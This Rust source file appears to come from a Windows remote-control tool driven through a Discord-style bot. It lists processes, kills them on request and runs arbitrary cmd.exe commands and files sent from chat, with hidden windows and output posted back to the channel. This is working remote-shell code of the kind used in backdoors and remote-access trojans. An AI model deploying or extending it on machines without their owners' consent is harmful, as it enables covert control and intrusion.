use std::{io::{BufWriter, Write}, fs::File, time::SystemTime, process::Command, os::windows::process::CommandExt};
use chrono::{DateTime, Local};
use rand::distributions::{Alphanumeric, DistString};
use serde_json::json;
use sysinfo::{SystemExt, ProcessExt, PidExt};
use crate::{BOT_TO_SEND, SYS};
pub enum ProcessSorting {
    Name= 1, Cpu= 2, Mem= 3, Pid= 4
}
pub async fn main(channel_id: u64, sorting: ProcessSorting) {
    let path= std::env::temp_dir().to_string_lossy().to_string() + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".txt";
    let mut f= BufWriter::new(File::create(&path).unwrap());
    let mut s= String::new();
    let mut sys= SYS.lock().await;
    sys.refresh_processes();
    std::thread::sleep(std::time::Duration::from_secs_f64(0.5));
    sys.refresh_processes();
    let processes= sys.processes();
    s+= &format!("Process amount: {}\nSorting: {}\n\n", processes.len(), match sorting {
        ProcessSorting::Name => "NAME",
        ProcessSorting::Cpu => "CPU",
        ProcessSorting::Mem => "RAM",
        ProcessSorting::Pid => "PID"
    });
    let mut procl= Vec::new();
    for (pid, proc) in processes {
        procl.push((proc.name(), pid.as_u32(), proc.cpu_usage(), proc.memory()));
    }
    match sorting {
        ProcessSorting::Name => {
            procl.sort_by(|value, next| {
                value.0.to_lowercase().cmp(&next.0.to_lowercase())
            });
        }
        ProcessSorting::Cpu => {
            procl.sort_by(|value, next| {
                value.2.total_cmp(&next.2)
            });
            procl.reverse();
        }
        ProcessSorting::Mem => {
            procl.sort_by(|value, next| {
                value.3.cmp(&next.3)
            });
            procl.reverse();
        }
        ProcessSorting::Pid => {
            procl.sort_by(|value, next| {
                value.1.cmp(&next.1)
            });
        }
    }
    for (name, pid, cpu, mem) in procl {
        let nname= if name.len()> 32 {
            name[..32].to_string()
        }else{
            let len= name.len();
            name.to_owned() + &std::iter::repeat(" ").take(32 - len).collect::<String>()
        };
        let mut npid= format!("{}", pid);
        if npid.len()< 10 {
            npid+= &std::iter::repeat(" ").take(10 - npid.len()).collect::<String>();
        }
        let mut ncpu= format!("{:.2}%", cpu);
        if ncpu.len()< 7 {
            ncpu+= &std::iter::repeat(" ").take(6 - ncpu.len()).collect::<String>();
        }
        let mut cmem= mem as f64;
        let mut smem= "B";
        while cmem> 1000. {
            cmem/= 1024.;
            smem= match smem {"B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
        }
        s+= &format!("{}  PID: {}  CPU: {}  RAM: {:.2} {}\n", nname, npid, ncpu, cmem, smem);
    }
    f.write_all(s.as_bytes()).unwrap();
    f.flush().unwrap();
    drop(f);
    BOT_TO_SEND.lock().await.push(json!({
        "channel": channel_id,
        "content": "Process list:",
        "files": [path],
        "delete_files": true,
        "react": ["📌"]
    }));
}
pub async fn kill_process(channel_id: u64, id: u32) {
    let mut sys= SYS.lock().await;
    sys.refresh_processes();
    let mut found= false;
    for (pid, proc) in sys.processes() {
        if pid.as_u32()== id {
            found= true;
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": format!("```Do you really want to the kill process: {}\nReact with 💀 to kill it or 🔴 to cancel```", proc.name()),
                "react": ["💀", "🔴"],
                "interaction": {
                    "kind": "kill",
                    "pid": id,
                }
            }));
            break;
        }
    }
    if !found {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": "```❗ Process not found```"
        }));
    }
}
pub async fn kill_process_confirmed(user: String, channel_id: u64, id: u32) {
    let mut sys= SYS.lock().await;
    sys.refresh_processes();
    
    let output= Command::new("taskkill.exe").creation_flags(0x08000000)
        .args(["/f", "/pid", &id.to_string()]).output().unwrap();
    BOT_TO_SEND.lock().await.push(json!({
        "channel": channel_id,
        "content": format!("```{}{}\nRequested by {} at {}```", String::from_utf8_lossy(&output.stdout).trim(), String::from_utf8_lossy(&output.stderr).trim(), user, Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r").to_string())
    }));
}
pub async fn main_execute(channel_id: u64, user: String, input: String) {
    let mut path= std::env::current_dir().unwrap();
    path.push(input.trim());
    match Command::new("cmd.exe").creation_flags(0x08000000)
            .current_dir(std::env::current_dir().unwrap()).arg("/c")
            .raw_arg(&path.to_string_lossy().to_string()).spawn() {
        Ok(_) => {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```Executed \"{}\" by {} on the remote PC```", input.trim(), user),
                "react": ["🔴"]
            }));
        }
        Err(e) => {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```❗ Unable to execute \"{}\" on the remote PC\nError: {:?}```", input.trim(), e),
                "react": ["🔴"]
            }));
        }
    }
}
pub async fn main_cmd(channel_id: u64, user: String, input: String) {
    match Command::new("cmd.exe").creation_flags(0x08000000)
            .current_dir(std::env::current_dir().unwrap()).arg("/c")
            .raw_arg(&input.trim()).output() {
        Ok(proc) => {
            let output= if proc.stdout.len()> 0 {proc.stdout}else{proc.stderr};
            if output.len()< 4090 {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": channel_id,
                    "content": &format!("```Executed (with CMD) \"{}\" by {} on the remote PC```", &input, user),
                    "react": ["🔴"],
                    "embed": true,
                    "title": "Output",
                    "description": String::from_utf8_lossy(&output),
                    "delete_files": true
                }));
            }else{
                let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                let mut f= BufWriter::new(File::create(&path).unwrap());
                f.write_all(&output).unwrap();
                f.flush().unwrap();
                drop(f);
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": channel_id,
                    "content": &format!("```Executed \"{}\" by {} on the remote PC```", &input, user),
                    "files": [path],
                    "react": ["🔴"],
                    "delete_files": true
                }));
            }
        }
        Err(_) => {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```❗ Unable to execute \"{}\" on the remote PC```", &input),
                "react": ["🔴"]
            }));
        }
    }
}
pub fn mem_to_str(mem: u64) -> String {
    let mut cmem= mem as f64;
    let mut smem= "B";
    while cmem> 1000. {
        cmem/= 1024.;
        smem= match smem {"B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
    }
    format!("{:.2} {}", cmem, smem)
}